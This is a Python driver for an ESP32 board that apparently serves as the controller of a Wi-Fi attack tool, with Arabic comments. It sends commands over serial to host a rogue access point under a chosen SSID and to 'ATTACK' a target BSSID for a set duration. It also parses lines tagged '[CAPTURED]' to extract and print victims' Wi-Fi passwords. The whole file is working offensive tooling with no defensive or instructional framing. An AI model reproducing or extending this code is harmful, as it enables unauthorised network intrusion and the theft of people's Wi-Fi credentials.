# esp_driver.py
import serial
import time
import threading
from config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET

class ESP32Driver:
    def __init__(self, port, baudrate=115200):
        self.port = port
        self.baudrate = baudrate
        self.ser = None
        self.is_connected = False
        self.captured_password = None
        self.stop_reading = False
        self.messages = [] # لتخزين الرسائل القادمة من البورد

    def connect(self):
        try:
            self.ser = serial.Serial(self.port, self.baudrate, timeout=1)
            time.sleep(2) # انتظار إعادة تشغيل البورد
            self.is_connected = True
            print(f"{C_GREEN}[+] ESP32 Connected on {self.port}{C_RESET}")
            
            # تشغيل خيط للاستماع المستمر
            t = threading.Thread(target=self._read_loop, daemon=True)
            t.start()
            return True
        except Exception as e:
            print(f"{C_RED}[!] Serial Connection Error: {e}{C_RESET}")
            return False

    def _read_loop(self):
        while self.is_connected and not self.stop_reading:
            try:
                if self.ser.in_waiting > 0:
                    line = self.ser.readline().decode('utf-8', errors='ignore').strip()
                    if line:
                        self._process_line(line)
            except:
                break

    def _process_line(self, line):
        # تحليل الردود القادمة من ESP32
        if "[CAPTURED]" in line:
            # استخراج الباسورد: [CAPTURED] mypassword123
            parts = line.split(" ", 1)
            if len(parts) > 1:
                self.captured_password = parts[1].strip()
                print(f"\n{C_GREEN}[!] CAPTURED DATA: {self.captured_password}{C_RESET}")
        
        elif "[STATUS]" in line:
            print(f"{C_CYAN}[ESP32 Status]: {line}{C_RESET}")
        elif "[EVENT]" in line:
            print(f"{C_YELLOW}[ESP32 Event]: {line}{C_RESET}")
        elif "[ERROR]" in line:
            print(f"{C_RED}[ESP32 Error]: {line}{C_RESET}")
        elif "[SUCCESS]" in line:
            print(f"{C_GREEN}[ESP32]: {line}{C_RESET}")

    def send_command(self, cmd):
        if self.is_connected:
            full_cmd = cmd + "\n"
            self.ser.write(full_cmd.encode())
            time.sleep(0.1)

    def start_host(self, ssid, channel):
        print(f"[*] Sending HOST command: {ssid} (CH: {channel})")
        self.send_command(f"HOST {ssid} {channel}")

    def start_attack(self, bssid, channel, duration=0):
        # إرسال المدة المحددة بدلاً من الصفر الثابت
        # print(f"[*] Sending ATTACK command: {bssid} (CH: {channel}) for {duration}s")
        self.send_command(f"ATTACK {bssid} {channel} {duration}")

    def send_ok(self):
        self.send_command("OK")

    def send_no(self):
        self.send_command("NO")

    def stop_all(self):
        self.send_command("STOP")
        
    def close(self):
        self.stop_reading = True
        self.send_command("STOP")
        if self.ser:
            self.ser.close()
        self.is_connected = False